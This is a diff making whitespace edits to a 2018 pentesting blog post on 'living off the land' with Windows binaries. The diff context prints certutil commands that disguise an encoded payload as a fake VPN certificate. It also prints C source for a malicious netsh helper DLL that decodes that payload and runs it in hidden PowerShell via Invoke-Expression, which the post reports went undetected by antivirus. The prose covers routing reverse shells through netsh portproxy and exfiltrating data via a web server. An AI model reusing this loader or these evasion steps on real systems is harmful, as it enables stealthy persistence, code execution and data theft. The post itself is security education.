@@ -4,11 +4,11 @@ description: With Windows Binaries
 
 # Living Off the Land
 
- Oct 20, 2018
+Oct 20, 2018
 
 ## Living Off the Land
 
- Posted in [Pentesting](https://liberty-shell.com/sec/category/pentesting)
+Posted in [Pentesting](https://liberty-shell.com/sec/category/pentesting)
 
 ### With Windows Binaries <a id="with-windows-binaries"></a>
 
@@ -95,7 +95,7 @@ When decoding with certutil, it will remove the header and footer, providing you
 ```text
 certutil -encode payload.txt vpn.crt
 certutil -f -encodehex vpn.crt vpn.crt
-certutil -f -encode vpn.crt vpn.crt 
+certutil -f -encode vpn.crt vpn.crt
 ```
 
 This should give us a nice bogus looking “certificate.” It’s also worth noting I attempted to use **assoc.exe** to allow .crt to execute as PowerShell without luck. Would be nice if PowerShell could execute the encoded “certificate” .crt file.
@@ -169,10 +169,10 @@ The source code executes certutil to run the decode process and powershell to ex
 DWORD WINAPI YahSure(LPVOID lpParameter)
 {
    system("@echo off && SET YAH=C:\\Users\\Public\\cisco.ps1 && \
-	FOR %Y IN (C:\\Users\\Public\\vpn.crt) DO certutil -f -decode %Y %YAH% >nul 2>nul && \
-	FOR %A IN (%YAH%) DO certutil -f -decodehex %A %YAH% >nul 2>nul && \
-	FOR %H IN (%YAH%) DO certutil -f -decode %H %YAH% >nul 2>nul && \
-	start powershell.exe -win hidden -nonI -nopro $bang = Get-Content %YAH%; del %YAH%; Invoke-Expression $bang");
+    FOR %Y IN (C:\\Users\\Public\\vpn.crt) DO certutil -f -decode %Y %YAH% >nul 2>nul && \
+    FOR %A IN (%YAH%) DO certutil -f -decodehex %A %YAH% >nul 2>nul && \
+    FOR %H IN (%YAH%) DO certutil -f -decode %H %YAH% >nul 2>nul && \
+    start powershell.exe -win hidden -nonI -nopro $bang = Get-Content %YAH%; del %YAH%; Invoke-Expression $bang");
 
    return 1;
 }
@@ -180,11 +180,11 @@ DWORD WINAPI YahSure(LPVOID lpParameter)
 //Custom netsh helper format
 extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
 {
-	HANDLE hand;
-	hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);
-	CloseHandle(hand);
+    HANDLE hand;
+    hand = CreateThread(NULL, 0, YahSure, NULL, 0, NULL);
+    CloseHandle(hand);
 
-	return NO_ERROR;
+    return NO_ERROR;
 }
 ```
 
@@ -194,8 +194,7 @@ Nothing was flagged when scanning with Windows Defender or Malewarebytes, nor wa
 
 ![alt text](https://liberty-shell.com/sec/assets/img/shell.gif)
 
-  
- An attacker could avoid sending the reverse shell directly back to its controlled ip, and configure port redirection via **netsh portproxy** to sieve through the web server. This may avoid network defense countermeasures as it’s a public facing server with plenty of traffic going in and out.
+An attacker could avoid sending the reverse shell directly back to its controlled ip, and configure port redirection via **netsh portproxy** to sieve through the web server. This may avoid network defense countermeasures as it’s a public facing server with plenty of traffic going in and out.
 
 An attacker could go another route and exfil data from CALVIN onto the share, then pull from the web server via GET/POST requests.
 
@@ -243,7 +242,5 @@ Although, a dedicated attacker could hack around application whitelisting….of 
 
 There are incredible opportunities within LOLBins, and it appears these [attacks are only increasing](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf). More ways to hack these binaries are still being released, so stay privy of these vectors and open to alternate defense strategies.
 
-{% embed url="https://liberty-shell.com/sec/2018/10/20/living-off-the-land/" %}
-
-
+{% embed url="https://liberty-shell.com/sec/2018/10/20/living-off-the-land/" caption="" %}
 
